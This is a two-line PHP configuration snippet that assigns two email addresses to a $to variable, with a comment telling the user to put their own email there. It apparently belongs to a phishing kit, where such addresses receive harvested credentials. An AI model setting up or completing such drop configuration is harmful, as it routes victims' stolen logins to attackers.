<?php

#Your email in=between "" below
$to = "c.c7r@yandex.com,gabi@shaqao.com";

?>